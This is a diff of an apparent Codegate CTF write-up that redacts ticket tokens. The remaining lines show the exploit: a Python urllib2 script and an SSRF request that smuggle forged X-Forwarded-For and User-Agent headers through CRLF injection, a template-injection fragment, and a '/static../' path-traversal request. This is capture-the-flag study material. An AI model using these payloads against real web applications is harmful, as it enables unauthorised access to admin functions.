@@ -11,7 +11,7 @@ http://110.10.147.169/renderer/
 http://58.229.253.144/renderer/
 
 DOWNLOAD :
-http://ctf.codegate.org/099ef54feeff0c4e7c2e4c7dfd7deb6e/022fd23aa5d26fbeea4ea890710178e9
+http://ctf.codegate.SECRET_REDACTED_BY_ANTIGRAVITYfd23aa5d26fbeea4ea890710178e9
 
 point : 750
 
@@ -278,7 +278,7 @@ exploit.py
 ```
 import urllib2
 
-url = "http://empty.jack.su/renderer/admin/ticket?ticket=6edaec793cac4db942472712a57d656b06d4cd0c HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nHost: 127.0.0.1\r\n\r\nLol"
+url = "http://empty.jack.su/renderer/admin/ticket?SECRET_REDACTED_BY_ANTIGRAVITY6d4cd0c HTTP/1.1\r\nX-Forwarded-For: 127.0.0.1\r\nUser-Agent: AdminBrowser/1.337\r\nHost: 127.0.0.1\r\n\r\nLol"
 
 info = urllib2.urlopen(url).read()
 print(info)
@@ -308,7 +308,7 @@ url=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: {{config.item
 
 With the following request we check that injection on the it's place:
 ```
-GET /static../tickets/74269dcedd704384f5eec8738f938ce9f6ca4640 HTTP/1.1
+GET /static..SECRET_REDACTED_BY_ANTIGRAVITY9f6ca4640 HTTP/1.1
 Host: 110.10.147.169
 
 ```
@@ -334,7 +334,7 @@ Host: 110.10.147.169
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 212
 
-url=http://127.0.0.1/renderer/admin/ticket?ticket=74269dcedd704384f5eec8738f938ce9f6ca4640%20HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aLol:
+url=http://127.0.0.1/renderer/admin/ticket?SECRET_REDACTED_BY_ANTIGRAVITY6ca4640%20HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aLol:
 ```
 
 Result:
